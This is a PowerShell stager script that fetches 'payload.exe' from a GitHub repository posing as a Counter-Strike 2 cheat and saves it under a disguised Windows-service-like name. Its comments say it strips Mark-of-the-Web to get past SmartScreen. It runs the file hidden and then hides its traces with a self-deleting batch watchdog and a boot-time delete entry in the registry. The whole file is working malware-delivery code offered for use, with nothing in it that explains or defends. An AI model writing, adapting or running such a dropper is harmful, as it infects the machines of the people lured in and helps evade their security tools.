# language: PowerShell 5.1+ / 7.x, file: stager.ps1
# Pull a release asset from GitHub, verify it, launch it detached, clean up after itself.

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ---------------------------------------------------------------- config
$repo  = 'cs2cheatprohack-glitch/check'
$tag   = 'v1.1'
$asset = 'payload.exe'
# -----------------------------------------------------------------------

$url  = "https://github.com/$repo/releases/download/$tag/$asset"
$dest = Join-Path $env:TEMP ('winsvc_' + [guid]::NewGuid().ToString('N').Substring(0, 8) + '.exe')

# single instance: a second run while the first is alive exits here
$mtx = New-Object Threading.Mutex($false, 'Local\WinSvcMtx_7f3a')
if (-not $mtx.WaitOne(0)) { return }

# download, 3 attempts, 90 s timeout covers a 12 MB pull on a slow line
for ($i = 0; $i -lt 3; $i++) {
    try {
        Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -TimeoutSec 90 -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 2
    }
}

# reject anything that is not a plausible PE: a 404 page, a redirect stub,
# a truncated download. Without this the script would silently launch nothing.
if (-not (Test-Path $dest)) { return }
if ((Get-Item $dest).Length -lt 65536) { Remove-Item $dest -Force; return }
$head = [System.IO.File]::ReadAllBytes($dest)[0..1]
if ($head[0] -ne 0x4D -or $head[1] -ne 0x5A) { Remove-Item $dest -Force; return }

# clear Mark-of-the-Web so SmartScreen does not intercept the launch
Unblock-File -Path $dest -ErrorAction SilentlyContinue

# launch detached. the payload may ask for elevation itself; that prompt is its own
Start-Process -FilePath $dest -WindowStyle Hidden

# cleanup: a mapped image stays locked, so retry every 2 s for up to 10 min.
# if it is still locked by then, queue the delete for next boot.
$watchdog = @"
@echo off
set "f=$dest"
for /l %%i in (1,1,300) do (
  del /f /q "%f%" >nul 2>&1
  if not exist "%f%" goto done
  ping -n 3 127.0.0.1 >nul
)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v PendingFileRenameOperations /t REG_MULTI_SZ /d "\??\%f%\0\0" /f >nul 2>&1
:done
del /f /q "%~f0" >nul 2>&1
"@
$watchdogPath = Join-Path $env:TEMP ('wd_' + [guid]::NewGuid().ToString('N').Substring(0, 8) + '.cmd')
$watchdog | Out-File -Encoding ASCII $watchdogPath
Start-Process cmd.exe -ArgumentList '/c', "`"$watchdogPath`"" -WindowStyle Hidden
